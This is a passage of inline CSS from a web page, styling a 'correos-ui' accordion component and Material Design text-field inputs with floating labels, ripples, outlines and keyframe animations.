			.sc-correos-ui-accordion-spa-h correos-ui-scroll-bar.sc-correos-ui-accordion-spa {
				display: none
			}

			.sc-correos-ui-accordion-spa-h .ui-title.sc-correos-ui-accordion-spa {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
				line-height: 1.375rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-accordion-spa-h .ui-title.sc-correos-ui-accordion-spa {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-accordion-spa-h .ui-title.sc-correos-ui-accordion-spa:hover {
				text-decoration: underline
			}

			.sc-correos-ui-accordion-spa-h .ui-figure.sc-correos-ui-accordion-spa {
				margin: 0;
				padding: 0;
				border: 0;
				font-size: 100%;
				font: inherit;
				vertical-align: baseline;
				width: 60px;
				height: 60px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-accordion-spa-h .ui-figure.sc-correos-ui-accordion-spa {
					width: 100px;
					height: 100px
				}
			}

			.sc-correos-ui-accordion-spa-h .ui-image.sc-correos-ui-accordion-spa {
				width: 100%;
				height: 100%
			}

			.sc-correos-ui-accordion-spa-h .ui-footer.sc-correos-ui-accordion-spa {
				margin-top: 16px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-ui-accordion-spa-h .ui-footer--column.sc-correos-ui-accordion-spa {
				-ms-flex-direction: column;
				flex-direction: column
			}

			.sc-correos-ui-accordion-spa-h .ui-body-content.sc-correos-ui-accordion-spa {
				color: var(--_ui-card-accordion-spa-text-color-body);
				font-weight: 300;
				font-size: 0.875rem;
				line-height: 1.375rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-accordion-spa-h .ui-body-content.sc-correos-ui-accordion-spa {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			[size=md].sc-correos-ui-accordion-spa-h .ui-footer.sc-correos-ui-accordion-spa {
				-ms-flex-direction: row;
				flex-direction: row;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			[size=md].sc-correos-ui-accordion-spa-h .ui-footer--column.sc-correos-ui-accordion-spa {
				-ms-flex-direction: column;
				flex-direction: column
			}

			[size=md].sc-correos-ui-accordion-spa-h .ui-footer.sc-correos-ui-accordion-spa correos-ui-button.sc-correos-ui-accordion-spa {
				margin-right: 16px
			}

			[size=lg].sc-correos-ui-accordion-spa-h .ui-footer.sc-correos-ui-accordion-spa {
				-ms-flex-direction: row;
				flex-direction: row;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			[size=lg].sc-correos-ui-accordion-spa-h .ui-footer--column.sc-correos-ui-accordion-spa {
				-ms-flex-direction: column;
				flex-direction: column
			}

			[size=lg].sc-correos-ui-accordion-spa-h .ui-footer.sc-correos-ui-accordion-spa correos-ui-button.sc-correos-ui-accordion-spa {
				margin-right: 24px
			}

			.detailSectionOpened.sc-correos-ui-accordion-spa-h {
				border: var(--_ui-card-accordion-spa-border-container);
				-webkit-box-shadow: var(--_ui-card-accordion-spa-box-shadow);
				box-shadow: var(--_ui-card-accordion-spa-box-shadow);
				padding: 24px
			}

			.detailSectionOpened.sc-correos-ui-accordion-spa-h .ui-header.sc-correos-ui-accordion-spa {
				padding: 0;
				margin-bottom: 1rem;
				-ms-flex-align: center;
				align-items: center
			}

			.detailSectionOpened.sc-correos-ui-accordion-spa-h .ui-content-accordion-spa.sc-correos-ui-accordion-spa {
				height: auto;
				visibility: visible;
				opacity: 1
			}

			.detailSectionOpened.sc-correos-ui-accordion-spa-h correos-ui-scroll-bar.sc-correos-ui-accordion-spa {
				display: block;
				max-height: 75vh
			}

			@media (min-width: 640px) {
				.detailSectionOpened.sc-correos-ui-accordion-spa-h correos-ui-scroll-bar.sc-correos-ui-accordion-spa {
					max-height: 50vh
				}
			}

			@media (min-width: 640px) {
				.detailSectionOpened.sc-correos-ui-accordion-spa-h correos-ui-scroll-bar.sc-correos-ui-accordion-spa {
					max-height: 50vh
				}
			}

			[variant=big-title].sc-correos-ui-accordion-spa-h {
				border: var(--_ui-card-accordion-spa-border-bg-title);
				-webkit-box-shadow: var(--_ui-card-accordion-spa-box-shadow-bg-title);
				box-shadow: var(--_ui-card-accordion-spa-box-shadow-bg-title)
			}

			[variant=big-title].sc-correos-ui-accordion-spa-h .ui-header.sc-correos-ui-accordion-spa {
				-ms-flex-align: center;
				align-items: center
			}
		</style>
		<style>
			.mdc-floating-label.sc-correos-ui-input {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 1rem;
				line-height: 1.75rem;
				font-weight: 400;
				letter-spacing: 0.009375em;
				text-decoration: inherit;
				text-transform: inherit;
				position: absolute;
				left: 0;
				-webkit-transform-origin: left top;
				transform-origin: left top;
				-webkit-transition: color 150ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: color 150ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), color 150ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), color 150ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1);
				line-height: 1.15rem;
				text-align: left;
				text-overflow: ellipsis;
				white-space: nowrap;
				cursor: text;
				overflow: hidden;
				will-change: transform
			}

			[dir=rtl].sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-floating-label[dir=rtl].sc-correos-ui-input {
				right: 0;
				left: auto;
				-webkit-transform-origin: right top;
				transform-origin: right top;
				text-align: right
			}

			.mdc-floating-label--float-above.sc-correos-ui-input {
				cursor: auto
			}

			.mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-106%) scale(0.75);
				transform: translateY(-106%) scale(0.75)
			}

			.mdc-floating-label--shake.sc-correos-ui-input {
				-webkit-animation: mdc-floating-label-shake-float-above-standard 250ms 1;
				animation: mdc-floating-label-shake-float-above-standard 250ms 1
			}

			@-webkit-keyframes mdc-floating-label-shake-float-above-standard {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
				}
			}

			@keyframes mdc-floating-label-shake-float-above-standard {
				0% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
				}

				33% {
					-webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					animation-timing-function: cubic-bezier(0.5, 0, 0.701732, 0.495819);
					-webkit-transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(4% - 0%)) translateY(-106%) scale(0.75)
				}

				66% {
					-webkit-animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					animation-timing-function: cubic-bezier(0.302435, 0.381352, 0.55, 0.956352);
					-webkit-transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(-4% - 0%)) translateY(-106%) scale(0.75)
				}

				100% {
					-webkit-transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75);
					transform: translateX(calc(0 - 0%)) translateY(-106%) scale(0.75)
				}
			}

			.mdc-line-ripple.sc-correos-ui-input {
				position: absolute;
				bottom: 0;
				left: 0;
				width: 100%;
				height: 2px;
				-webkit-transform: scaleX(0);
				transform: scaleX(0);
				-webkit-transition: opacity 180ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 180ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 180ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 180ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: transform 180ms cubic-bezier(0.4, 0, 0.2, 1), opacity 180ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: transform 180ms cubic-bezier(0.4, 0, 0.2, 1), opacity 180ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-transform 180ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				z-index: 2
			}

			.mdc-line-ripple--active.sc-correos-ui-input {
				-webkit-transform: scaleX(1);
				transform: scaleX(1);
				opacity: 1
			}

			.mdc-line-ripple--deactivating.sc-correos-ui-input {
				opacity: 0
			}

			.mdc-notched-outline.sc-correos-ui-input {
				display: -ms-flexbox;
				display: flex;
				position: absolute;
				right: 0;
				left: 0;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				width: 100%;
				max-width: 100%;
				height: 100%;
				text-align: left;
				pointer-events: none
			}

			[dir=rtl].sc-correos-ui-input .mdc-notched-outline.sc-correos-ui-input,
			.mdc-notched-outline[dir=rtl].sc-correos-ui-input {
				text-align: right
			}

			.mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-notched-outline__trailing.sc-correos-ui-input {
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				height: 100%;
				border-top: 1px solid;
				border-bottom: 1px solid;
				pointer-events: none
			}

			.mdc-notched-outline__leading.sc-correos-ui-input {
				border-left: 1px solid;
				border-right: none;
				width: 12px
			}

			[dir=rtl].sc-correos-ui-input .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-notched-outline__leading[dir=rtl].sc-correos-ui-input {
				border-left: none;
				border-right: 1px solid
			}

			.mdc-notched-outline__trailing.sc-correos-ui-input {
				border-left: none;
				border-right: 1px solid;
				-ms-flex-positive: 1;
				flex-grow: 1
			}

			[dir=rtl].sc-correos-ui-input .mdc-notched-outline__trailing.sc-correos-ui-input,
			.mdc-notched-outline__trailing[dir=rtl].sc-correos-ui-input {
				border-left: 1px solid;
				border-right: none
			}

			.mdc-notched-outline__notch.sc-correos-ui-input {
				-ms-flex: 0 0 auto;
				flex: 0 0 auto;
				width: auto;
				max-width: calc(100% - 12px * 2)
			}

			.mdc-notched-outline.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				display: inline-block;
				position: relative;
				max-width: 100%
			}

			.mdc-notched-outline.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				text-overflow: clip
			}

			.mdc-notched-outline--upgraded.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				max-width: calc(100% / .75)
			}

			.mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
				padding-left: 0;
				padding-right: 8px;
				border-top: none
			}

			[dir=rtl].sc-correos-ui-input .mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input,
			.mdc-notched-outline--notched.sc-correos-ui-input .mdc-notched-outline__notch[dir=rtl].sc-correos-ui-input {
				padding-left: 8px;
				padding-right: 0
			}

			.mdc-notched-outline--no-label.sc-correos-ui-input .mdc-notched-outline__notch.sc-correos-ui-input {
				padding: 0
			}

			@-webkit-keyframes mdc-ripple-fg-radius-in {
				from {
					-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
					transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
				}

				to {
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
					transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
				}
			}

			@keyframes mdc-ripple-fg-radius-in {
				from {
					-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
					transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
				}

				to {
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
					transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
				}
			}

			@-webkit-keyframes mdc-ripple-fg-opacity-in {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: 0
				}

				to {
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}
			}

			@keyframes mdc-ripple-fg-opacity-in {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: 0
				}

				to {
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}
			}

			@-webkit-keyframes mdc-ripple-fg-opacity-out {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}

				to {
					opacity: 0
				}
			}

			@keyframes mdc-ripple-fg-opacity-out {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}

				to {
					opacity: 0
				}
			}

			.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-input {
				--mdc-ripple-surface-test-edge-var: 1px solid #000;
				visibility: hidden
			}

			.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-input::before {
				border: var(--mdc-ripple-surface-test-edge-var)
			}

			.mdc-text-field-helper-text.sc-correos-ui-input {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 0.75rem;
				line-height: 1.25rem;
				font-weight: 400;
				letter-spacing: 0.0333333333em;
				text-decoration: inherit;
				text-transform: inherit;
				display: block;
				margin-top: 0;
				line-height: normal;
				margin: 0;
				-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				will-change: opacity
			}

			.mdc-text-field-helper-text.sc-correos-ui-input::before {
				display: inline-block;
				width: 0;
				height: 16px;
				content: "";
				vertical-align: 0
			}

			.mdc-text-field-helper-text--persistent.sc-correos-ui-input {
				-webkit-transition: none;
				transition: none;
				opacity: 1;
				will-change: initial
			}

			.mdc-text-field-character-counter.sc-correos-ui-input {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 0.75rem;
				line-height: 1.25rem;
				font-weight: 400;
				letter-spacing: 0.0333333333em;
				text-decoration: inherit;
				text-transform: inherit;
				display: block;
				margin-top: 0;
				line-height: normal;
				margin-left: auto;
				margin-right: 0;
				padding-left: 16px;
				padding-right: 0;
				white-space: nowrap
			}

			.mdc-text-field-character-counter.sc-correos-ui-input::before {
				display: inline-block;
				width: 0;
				height: 16px;
				content: "";
				vertical-align: 0
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
			.mdc-text-field-character-counter[dir=rtl].sc-correos-ui-input {
				margin-left: 0;
				margin-right: auto
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input,
			.mdc-text-field-character-counter[dir=rtl].sc-correos-ui-input {
				padding-left: 0;
				padding-right: 16px
			}

			.mdc-text-field--with-leading-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input,
			.mdc-text-field--with-trailing-icon.sc-correos-ui-input .mdc-text-field__icon.sc-correos-ui-input {
				position: absolute;
				top: 50%;
				-webkit-transform: translateY(-50%);
				transform: translateY(-50%);
				cursor: pointer
			}

			.mdc-text-field__icon.sc-correos-ui-input:not([tabindex]),
			.mdc-text-field__icon[tabindex="-1"].sc-correos-ui-input {
				cursor: default;
				pointer-events: none
			}

			.mdc-text-field.sc-correos-ui-input {
				--mdc-ripple-fg-size: 0;
				--mdc-ripple-left: 0;
				--mdc-ripple-top: 0;
				--mdc-ripple-fg-scale: 1;
				--mdc-ripple-fg-translate-end: 0;
				--mdc-ripple-fg-translate-start: 0;
				-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
				height: 56px;
				border-radius: 4px 4px 0 0;
				display: -ms-inline-flexbox;
				display: inline-flex;
				position: relative;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				overflow: hidden;
				will-change: opacity, transform, color
			}

			.mdc-text-field.sc-correos-ui-input::before,
			.mdc-text-field.sc-correos-ui-input::after {
				position: absolute;
				border-radius: 50%;
				opacity: 0;
				pointer-events: none;
				content: ""
			}

			.mdc-text-field.sc-correos-ui-input::before {
				-webkit-transition: opacity 15ms linear, background-color 15ms linear;
				transition: opacity 15ms linear, background-color 15ms linear;
				z-index: 1
			}

			.mdc-text-field.mdc-ripple-upgraded.sc-correos-ui-input::before {
				-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
				transform: scale(var(--mdc-ripple-fg-scale, 1))
			}

			.mdc-text-field.mdc-ripple-upgraded.sc-correos-ui-input::after {
				top: 0;
				left: 0;
				-webkit-transform: scale(0);
				transform: scale(0);
				-webkit-transform-origin: center center;
				transform-origin: center center
			}

			.mdc-text-field.mdc-ripple-upgraded--unbounded.sc-correos-ui-input::after {
				top: var(--mdc-ripple-top, 0);
				left: var(--mdc-ripple-left, 0)
			}

			.mdc-text-field.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-input::after {
				-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
				animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
			}

			.mdc-text-field.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-input::after {
				-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
				animation: mdc-ripple-fg-opacity-out 150ms;
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}

			.mdc-text-field.sc-correos-ui-input::before,
			.mdc-text-field.sc-correos-ui-input::after {
				background-color: rgba(0, 0, 0, 0.87)
			}

			.mdc-text-field.sc-correos-ui-input:hover::before {
				opacity: 0.04
			}

			.mdc-text-field.mdc-ripple-upgraded--background-focused.sc-correos-ui-input::before,
			.mdc-text-field.sc-correos-ui-input:not(.mdc-ripple-upgraded):focus::before {
				-webkit-transition-duration: 75ms;
				transition-duration: 75ms;
				opacity: 0.12
			}

			.mdc-text-field.sc-correos-ui-input::before,
			.mdc-text-field.sc-correos-ui-input::after {
				top: calc(50% - 100%);
				left: calc(50% - 100%);
				width: 200%;
				height: 200%
			}

			.mdc-text-field.mdc-ripple-upgraded.sc-correos-ui-input::after {
				width: var(--mdc-ripple-fg-size, 100%);
				height: var(--mdc-ripple-fg-size, 100%)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.6)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.87)
			}

			.mdc-text-field.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
				caret-color: #6200ee;
				caret-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				border-bottom-color: rgba(0, 0, 0, 0.42)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
				border-bottom-color: rgba(0, 0, 0, 0.87)
			}

			.mdc-text-field.sc-correos-ui-input .mdc-line-ripple.sc-correos-ui-input {
				background-color: #6200ee;
				background-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--textarea) {
				border-bottom-color: rgba(0, 0, 0, 0.12)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-helper-text.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.6)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field-character-counter.sc-correos-ui-input,
			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled)+.mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field-character-counter.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.6)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-text-field__icon.sc-correos-ui-input {
				color: rgba(0, 0, 0, 0.54)
			}

			.mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) {
				background-color: whitesmoke
			}

			.mdc-text-field.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 16px;
				right: initial;
				top: 50%;
				-webkit-transform: translateY(-50%);
				transform: translateY(-50%);
				pointer-events: none
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 16px
			}

			.mdc-text-field.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				-webkit-transform: translateY(-106%) scale(0.75);
				transform: translateY(-106%) scale(0.75)
			}

			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 4px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--textarea.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 4px
			}

			.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 4px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 4px
			}

			.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				left: 36px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input,
			.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 36px
			}

			.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input {
				left: 40px;
				right: initial
			}

			[dir=rtl].sc-correos-ui-input .mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label--float-above.sc-correos-ui-input,
			.mdc-text-field--outlined--with-leading-icon.sc-correos-ui-input .mdc-floating-label--float-above[dir=rtl].sc-correos-ui-input {
				left: initial;
				right: 40px
			}

			.mdc-text-field__input.sc-correos-ui-input {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 1rem;
				font-weight: 400;
				letter-spacing: 0.009375em;
				text-decoration: inherit;
				text-transform: inherit;
				-ms-flex-item-align: end;
				align-self: flex-end;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				width: 100%;
				height: 100%;
				padding: 20px 16px 6px;
				-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
				border: none;
				border-bottom: 1px solid;
				border-radius: 0;
				background: none;
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none
			}

			.mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder {
				-webkit-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				color: rgba(0, 0, 0, 0.54)
			}

			.mdc-text-field__input.sc-correos-ui-input::-moz-placeholder {
				-moz-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				color: rgba(0, 0, 0, 0.54)
			}

			.mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder {
				-ms-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				color: rgba(0, 0, 0, 0.54)
			}

			.mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder {
				-ms-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				color: rgba(0, 0, 0, 0.54)
			}

			.mdc-text-field__input.sc-correos-ui-input::placeholder {
				-webkit-transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: opacity 67ms cubic-bezier(0.4, 0, 0.2, 1);
				opacity: 0;
				color: rgba(0, 0, 0, 0.54)
			}

			.mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder {
				color: rgba(0, 0, 0, 0.54) !important
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder,
			.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder,
			.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-webkit-input-placeholder {
				-webkit-transition-delay: 40ms;
				transition-delay: 40ms;
				-webkit-transition-duration: 110ms;
				transition-duration: 110ms;
				opacity: 1
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-moz-placeholder,
			.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-moz-placeholder,
			.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-moz-placeholder {
				transition-delay: 40ms;
				transition-duration: 110ms;
				opacity: 1
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder,
			.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder,
			.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input:-ms-input-placeholder {
				transition-delay: 40ms;
				transition-duration: 110ms;
				opacity: 1
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder,
			.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder,
			.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::-ms-input-placeholder {
				transition-delay: 40ms;
				transition-duration: 110ms;
				opacity: 1
			}

			.mdc-text-field--fullwidth.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::placeholder,
			.mdc-text-field--no-label.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::placeholder,
			.mdc-text-field--focused.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input::placeholder {
				-webkit-transition-delay: 40ms;
				transition-delay: 40ms;
				-webkit-transition-duration: 110ms;
				transition-duration: 110ms;
				opacity: 1
			}

			.mdc-text-field__input.sc-correos-ui-input:focus {
				outline: none
			}

			.mdc-text-field__input.sc-correos-ui-input:invalid {
				-webkit-box-shadow: none;
				box-shadow: none
			}

			.mdc-text-field__input.sc-correos-ui-input:-webkit-autofill {
				z-index: auto !important
			}

			.mdc-text-field--no-label.sc-correos-ui-input:not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
				padding-top: 16px;
				padding-bottom: 16px
			}

			.mdc-text-field__input.sc-correos-ui-input:-webkit-autofill+.mdc-floating-label.sc-correos-ui-input {
				-webkit-transform: translateY(-50%) scale(0.75);
				transform: translateY(-50%) scale(0.75);
				cursor: auto
			}

			.mdc-text-field--outlined.sc-correos-ui-input {
				border: none;
				overflow: visible
			}

			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__leading.sc-correos-ui-input,
			.mdc-text-field--outlined.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-notched-outline__notch.sc-correos-ui-input,
